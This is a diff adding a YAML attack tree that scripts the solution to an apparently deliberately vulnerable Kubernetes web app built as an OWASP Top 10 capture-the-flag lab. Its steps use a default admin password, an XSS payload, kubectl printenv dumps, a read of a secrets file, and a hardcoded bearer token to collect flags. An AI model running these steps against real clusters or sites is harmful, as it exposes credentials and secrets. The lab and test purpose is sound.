@@ -1,0 +1,96 @@
+attack:
+  name: "Web Application Attack Tree"
+  description: "Attack paths for vulnerable web application running inside Kubernetes OWASP Top 10 CTF."
+
+  steps:
+    - id: 1.0
+      name: "Access frontend with default password"
+      command: "curl -s 'http://localhost:80/admin?password=d3fault_adm1n_p@ss'"
+      tags: ["frontend", "default_password"]
+      on_success:
+        - capture_flag: "FLAG{admin_portal_access}"
+      on_failure:
+        - log: "Admin password failed, proceeding to env var leak"
+        - next: 1.1
+
+    - id: 1.1
+      name: "Extract frontend env vars"
+      command: "kubectl exec -n vulnerable-app deploy/frontend -- printenv"
+      on_success:
+        - capture_flag: "FLAG{environment_variables_exposure_frontend}"
+      on_failure:
+        - log: "Could not extract frontend env vars"
+        - next: 1.2
+
+    - id: 1.2
+      name: "Trigger XSS via query param"
+      command: "curl -s 'http://localhost:80/?message=<script>alert(checkFlag())</script>'"
+      on_success:
+        - capture_flag: "FLAG{client_side_javascript_leak}"
+      on_failure:
+        - log: "XSS payload did not return expected flag"
+        - next: 1.3
+
+    - id: 1.3
+      name: "Access hidden file via image history"
+      command: "kubectl exec -n vulnerable-app deploy/frontend -- sh -c 'grep -r FLAG /app || true'"
+      on_success:
+        - capture_flag: "FLAG{backdoor_in_maintenance_script}"
+        - capture_flag: "FLAG{docker_image_history_leak}"
+        - capture_flag: "FLAG{entrypoint_script_leak}"
+      on_failure:
+        - log: "No flags found in frontend filesystem"
+
+    - id: 2.0
+      name: "Extract backend env vars"
+      command: "kubectl exec -n vulnerable-app deploy/backend -- printenv"
+      on_success:
+        - capture_flag: "FLAG{environment_variables_exposure_backend}"
+      on_failure:
+        - log: "Backend env vars not accessible"
+        - next: 2.1
+
+    - id: 2.1
+      name: "Get backend debug config"
+      command: "curl -s http://localhost:80/api/config"
+      on_success:
+        - capture_flag: "FLAG{debug_mode_information_leak}"
+      on_failure:
+        - log: "Debug endpoint not leaking as expected"
+        - next: 2.2
+
+    - id: 2.2
+      name: "Check internal config mount"
+      command: "kubectl exec -n vulnerable-app deploy/backend -- cat /app/internal/config/secrets.txt"
+      on_success:
+        - capture_flag: "FLAG{sensitive_backend_config}"
+      on_failure:
+        - log: "Internal secrets file not found"
+        - next: 2.3
+
+    - id: 2.3
+      name: "Find flag in backend source"
+      command: "kubectl exec -n vulnerable-app deploy/backend -- sh -c 'grep -r FLAG /app || true'"
+      on_success:
+        - capture_flag: "FLAG{backend_database_access}"
+        - capture_flag: "FLAG{insecure_shell_script_flag}"
+      on_failure:
+        - log: "Backend grep scan failed to reveal flags"
+        - next: 2.4
+
+    - id: 2.4
+      name: "Access backend /internal/admin without restriction"
+      command: "curl -s http://localhost:80/api/internal/admin"
+      on_success:
+        - capture_flag: "FLAG{missing_network_policy}"
+      on_failure:
+        - log: "Internal admin API protected"
+        - next: 2.5
+
+    - id: 2.5
+      name: "Check insecure /api/flags endpoint"
+      command: "curl -s -H 'Authorization: Bearer ey1234secretapikeyhere5678' http://localhost:80/api/flags"
+      on_success:
+        - capture_flag: "FLAG{backend_database_access}"
+      on_failure:
+        - log: "API /flags endpoint is secured or token invalid"
